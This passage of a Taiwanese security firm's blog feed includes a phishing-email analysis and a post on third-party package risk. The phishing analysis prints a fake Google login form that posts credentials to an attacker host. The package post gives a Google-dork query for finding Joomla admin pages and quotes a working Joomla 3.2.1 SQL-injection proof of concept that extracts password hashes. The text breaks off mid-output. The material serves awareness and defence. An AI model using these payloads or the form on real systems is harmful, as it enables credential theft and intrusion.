&lt;p&gt;使用 CSP 可以有效提升攻擊難度，讓許多常見的 XSS 攻擊失效，是一個非常推薦開發者使用的 HTTP header。但由於目前的開發者在 HTML 裡面寫 inline script 及 inline CSS 的比例非常高，同時也有一些網路服務預設都需要使用 inline script（例如 Google Analytics，相關解法可參考&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;這裡&lt;/a&gt;），因此要享受這樣的安全之前，可能需要先付出許多時間與心力將網站大幅整理，套用 CSP 規範後網頁才能正常運作。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/</link>
                <guid>https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy</guid>
                <pubDate>Tue, 08 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Google 帳號釣魚案例</title>
                <description>&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail 國家資助的攻擊者警告&quot; title=&quot;Gmail 國家資助的攻擊者警告&quot; /&gt;&lt;/p&gt;

&lt;p&gt;駭客間的戰爭已經不只是個人對個人，而已經擴大成國家對國家。一個國家為了獲取他國的機密文件、情報、個人資料等，都會想盡各種辦法入侵帳號、寄送惡意郵件、釣魚盜取密碼等。而身為受害者的我們能做什麼呢？Google 官方提出的建議是：加強密碼安全、注意登入 IP 位址、更新自己使用的軟體、&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;開啟二階段驗證&lt;/a&gt;。當然有良好的資安意識才是更重要的。&lt;/p&gt;

&lt;p&gt;正好今天收到一個簡單的案例，提供給各位參考。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;在信箱中躺著一封很像是國外客戶的信件「Company Profile / Order Details」。內容看起來也很正常，並且附上了公司的基本資料為附加檔案。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;釣魚信件&quot; title=&quot;釣魚信件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;點開附件，會發現畫面先跳了 JavaScript 警告視窗後，隨即導向到 Google 登入頁面。&lt;/p&gt;

&lt;p&gt;注意看，這個登入頁面是真的嗎？有沒有發現畫面上的「Stay signed in」前面的勾變成方框了？瀏覽器上的網址也是在本機的位址。想想看，怎麼可能點了附件之後，跳轉到 Google 登入畫面？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;釣魚信件附件假冒 Google 登入&quot; title=&quot;釣魚信件附件假冒 Google 登入&quot; /&gt;&lt;/p&gt;

&lt;p&gt;讓我們看一下原始碼，會發現他的 form 被改成一個奇怪的網址，看起來就是惡意網站。其餘網頁的部份都是從 Google 真實的登入頁面抓取下來修改的。因此只要一不注意，就會以為是真的 Google 登入畫面而輸入帳號密碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;釣魚信件原始碼&quot; title=&quot;釣魚信件原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;節錄部分 code 如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://cantonfair.a78.org/yahoo/post.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;gaia_loginform&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;GALX&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;6UMbQQmFgwI&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;continue&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://mail.google.com/mail/&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;service&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mail&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hl&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;en&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;scc&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sacu&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;☃&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;js_disabled&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube:424:1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Password&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;rc-button rc-button-submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Sign in&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;發現了嗎？其中 form 的 action 欄位被取代成「&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;」，而這個頁面會直接接收受害者輸入的帳號密碼，並且自動跳轉到真正的 Google 登入頁面。攻擊者從 a78.org 這個網站中直接取得所有被駭的人輸入的帳號密碼。&lt;/p&gt;

&lt;p&gt;這是一個很簡單、典型、又易被發現的釣魚案例。如果一時不察不小心輸入了帳號密碼，下次帳號被盜的就是自己。建議大家在收取信件的時候遵循幾大原則：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不隨便開啟附加檔案：附件常夾帶惡意程式、執行檔、惡意文件、釣魚網頁等，切勿隨便開啟。可使用 Google Docs 開啟附件文件防止惡意文件攻擊 Adobe PDF Reader、Microsoft Office 等程式。更常有把惡意程式加密壓縮後寄出，在信中附上密碼，借此規避防毒軟體的偵測，不可不慎。&lt;/li&gt;
  &lt;li&gt;注意信件中的超連結 URL：釣魚信件常在超連結中使用惡意網站的 URL，在點選之前務必仔細檢查，更要小心「Goog&lt;strong&gt;l&lt;/strong&gt;e」及「Goog&lt;strong&gt;1&lt;/strong&gt;e」之類的英文數字差異。&lt;/li&gt;
  &lt;li&gt;注意信件中的語氣：有的時候攻擊者仿冒你身邊可信任的人寄信給你，但是語氣、用詞要非常精準。如果出現了「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」你就會發現這個應該不太像是台灣本土的信件用語。&lt;/li&gt;
  &lt;li&gt;不在信件中夾帶機敏資料：信件是不安全的，切勿在信中提到帳號、密碼、個資等機密資料。&lt;/li&gt;
  &lt;li&gt;不回應陌生郵件：郵件中會夾帶自己的 IP 位址，回應信件可能讓攻擊者得到這些資料。&lt;/li&gt;
  &lt;li&gt;使用安全的郵件軟體：若使用安全的郵件軟體、平台，例如 Gmail，遇到惡意郵件時，會即時阻擋並且警告用戶。如果使用自己的郵件軟體，就要特別注意釣魚等攻擊。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;電子郵件的攻擊已經成為滲透攻擊主要的手法之一，不少國際資安事件都是肇因於惡意郵件。例如 2013 年韓國 DarkSeoul 事件，以及竄改交易匯款資料郵件詐取匯款等。身為目標的我們更要時時注意使用電子郵件時的安全事項。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/</link>
                <guid>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</guid>
                <pubDate>Mon, 31 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>使用第三方套件所要擔負的資安風險</title>
                <description>&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;

&lt;p&gt;在服務眾多客戶之後，我們深知這些問題的嚴重性。以下我們將就幾個經典的案例來說明使用第三方套件所要擔負的風險，並且分享我們對於第三方套件的安全建議。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;程式碼的安全性&quot;&gt;程式碼的安全性？&lt;/h3&gt;

&lt;p&gt;程式碼的品質直接決定了系統的安全性。如果一個套件有以下幾點因素：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;程式開發已久難以修改&lt;/li&gt;
  &lt;li&gt;開發人員無安全觀念&lt;/li&gt;
  &lt;li&gt;大量整合外部套件，無法控管每個套件安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;可能就因為程式碼難以修改，形成漏洞百出的程式架構。若是之後陸續發生安全問題，儘管不斷的修補漏洞，但卻會因為程式碼的設計、架構等因素，造成日後依舊陸續有安全疑慮。&lt;/p&gt;

&lt;h3 id=&quot;案例說明dedecms&quot;&gt;案例說明：DedeCMS&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; 是知名的內容管理系統，不少公司拿此套件架設網站、部落格等。但在這幾個月，在「&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲平台&lt;/a&gt;」上陸續有人揭露 DedeCMS 的漏洞。包括大量各種 SQL Injection、Cross-Site Scripting 弱點等等，甚至還包括 Command Execution 問題。如果沒有即時修正這些問題，小則造成用戶帳號被盜，大則造成整台主機被入侵，取得作業系統權限。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;烏雲漏洞報告平台&quot; title=&quot;烏雲漏洞報告平台&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;什麼系統沒被找到漏洞過呢？有那麼嚴重嗎？但該系統已經不只一次出現重大漏洞導致企業遭到入侵，在今年一二月份更是遭揭露多達十數個高風險 SQL Injection 資料庫注入漏洞。此現象凸顯該套件的設計並未經過安全測試，並且採用不安全的程式撰寫方式，未來可能會有更多隱含的漏洞釋出。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在平台中搜尋關鍵字「DedeCMS」，會發現漏洞提報的次數相當多，在漏洞的評論中也有不少技術人員進行討論。但更多的疑惑是為什麼 DedeCMS 會一再的發生資安問題。例如以下漏洞：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;Dedecms某命令執行漏洞&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMS全版本通殺SQL注入(真正的無任何限制附官方測試結果)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMS全版本通殺SQL注入(無任何限制)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;Dedecms某命令执行漏洞（续）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;而於另一個「&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug 安全漏洞信息庫&lt;/a&gt;」也可以看到不少 DedeCMS 的蹤影。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebug安全漏洞信息庫&quot; title=&quot;sebug安全漏洞信息庫&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果官方在第一時間就能接獲通報、了解問題並修正解決，提供更新程式給客戶更新，那安全的風險會小些。但在官方尚未釋出更新的這段時間，網站將完全的暴露在風險當中。有心人士看到套件的漏洞陸續被揭露，也會更有興趣尋找使用該套件的網站攻擊。&lt;/p&gt;

&lt;h3 id=&quot;案例說明joomla&quot;&gt;案例說明：Joomla!&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; 是另一套國際非常知名的 CMS 系統，因為其便利性，很多企業、學校、政府單位，都採用此套件建立網站。透過 Google Hacking 方式可以找到台灣非常多網站都使用 Joomla! 架站。&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:管理區 inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking 尋找 Joomla!&quot; title=&quot;Google Hacking 尋找 Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但是如果今天這個系統出了問題呢？「Joomla!」因為外掛、套件眾多，也經常成為漏洞發掘的對象。在 2014/02/05，國外釋出了一個 SQL Injection Exploit，可以導致網站帳號密碼直接被導出。&lt;/p&gt;

&lt;p&gt;官方安全公告：&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit 位址：&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
 
will cause an error:
 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;\)&amp;#39; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &amp;#39;com_weblinks.categories&amp;#39; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
 
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
 
Now i can easily exploit this flaw:
 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
 
1054 Unknown column &amp;#39;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&amp;#39; in &amp;#39;where clause&amp;#39; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; &amp;#39;com_weblinks.categories&amp;#39;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 